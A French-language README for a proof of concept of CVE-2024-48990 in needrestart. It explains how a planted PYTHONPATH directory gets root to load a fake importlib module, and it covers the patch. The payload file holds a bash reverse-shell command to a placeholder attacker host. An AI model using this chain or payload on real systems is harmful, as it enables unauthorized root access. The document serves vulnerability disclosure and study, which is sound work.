# CVE-2024-48990-PoC

### ğŸ” L'ORIGINE DE LA FAILLE

#### 1ï¸âƒ£ **Le Code VulnÃ©rable dans needrestart**

La faille se trouve dans le fichier `perl/lib/NeedRestart/Interp/Python.pm`. Voici ce que fait needrestart :

```perl
# needrestart lit les variables d'environnement du processus Python
my %env = nr_parse_env($pid);  # Lit /proc/<pid>/environ

# Si PYTHONPATH existe, needrestart l'utilise directement !
$ENV{PYTHONPATH} = $env{PYTHONPATH} if(defined($env{PYTHONPATH}));

# Puis needrestart lance Python avec cette PYTHONPATH
my ($pyread, $pywrite) = nr_fork_pipe2($self->{debug}, $ptable->{exec}, '-');
print $pywrite "import sys\nprint(sys.path)\n";  # â† CODE EXÃ‰CUTÃ‰
```

#### 2ï¸âƒ£ **Pourquoi c'est dangereux ?**

**needrestart fait CONFIANCE AVEUGLE** aux variables d'environnement de l'utilisateur :

1. **needrestart tourne en root** (lancÃ© par `sudo apt install...`)
2. Il scanne TOUS les processus Python actifs
3. Il lit leur `PYTHONPATH` depuis `/proc/<pid>/environ`
4. **Il copie cette PYTHONPATH dans son propre environnement**
5. Il exÃ©cute du code Python **en tant que root** avec cette PYTHONPATH modifiÃ©e

### ğŸ’¥ LA CHAÃNE D'EXPLOITATION

#### Ã‰tape par Ã©tape :

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. Attaquant (utilisateur normal)   â”‚
â”‚    export PYTHONPATH=/tmp/evil      â”‚
â”‚    python3 loop.py  # tourne en     â”‚
â”‚                     # boucle infinieâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 2. Admin fait une mise Ã  jour       â”‚
â”‚    sudo apt install curl            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 3. apt lance needrestart (en ROOT)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 4. needrestart scanne les processus â”‚
â”‚    - Trouve le processus Python     â”‚
â”‚    - Lit /proc/<pid>/environ        â”‚
â”‚    - Trouve PYTHONPATH=/tmp/evil    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 5. needrestart copie la PYTHONPATH  â”‚
â”‚    $ENV{PYTHONPATH} = "/tmp/evil"   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 6. needrestart exÃ©cute Python       â”‚
â”‚    avec la PYTHONPATH malveillante  â”‚
â”‚    "import sys" â† dÃ©clenche importlibâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 7. Python charge /tmp/evil/importlibâ”‚
â”‚    __init__.py s'exÃ©cute EN ROOT!   â”‚
â”‚    â†’ Reverse shell root obtenu! ğŸ‰  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### ğŸ¯ L'ASTUCE CLÃ‰E : importlib

**Pourquoi `importlib` ?**

```python
# needrestart exÃ©cute ce code :
import sys
print(sys.path)
```

* `sys` est un module **built-in** â†’ on ne peut pas le hijacker
* **MAIS** l'instruction `import` elle-mÃªme utilise le module `importlib` !
* `importlib` est **chargÃ© dynamiquement** â†’ on peut le hijacker !

### ğŸ“‚ Structure de l'exploit

```bash
/tmp/evil/
â””â”€â”€ importlib/
    â””â”€â”€ __init__.py   # â† S'exÃ©cute automatiquement au chargement !
```

Le fichier `__init__.py` contient :

```python
import os
# Ce code s'exÃ©cute EN ROOT quand needrestart fait "import sys"
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER/1337 0>&1'")
```

### ğŸ”‘ POURQUOI Ã‡A MARCHE ?

#### La faille rÃ©side dans ces 3 problÃ¨mes combinÃ©s :

1. **Confiance aveugle** : needrestart lit et utilise `PYTHONPATH` de l'utilisateur sans validation
2. **Ã‰lÃ©vation de contexte** : La `PYTHONPATH` de l'utilisateur devient la `PYTHONPATH` de root
3. **ExÃ©cution automatique** : Les fichiers `__init__.py` s'exÃ©cutent dÃ¨s le chargement du module

### ğŸ›¡ï¸ LE PATCH (version 3.8)

Le correctif est simple : **ne plus copier PYTHONPATH** !

```perl
# AVANT (vulnÃ©rable) :
$ENV{PYTHONPATH} = $env{PYTHONPATH} if(defined($env{PYTHONPATH}));

# APRÃˆS (corrigÃ©) :
# Cette ligne est supprimÃ©e !
```

***

**En rÃ©sumÃ©** : La faille vient du fait que needrestart **fait confiance aux variables d'environnement des utilisateurs normaux et les utilise dans un contexte root**, permettant un dÃ©tournement de bibliothÃ¨que Python.
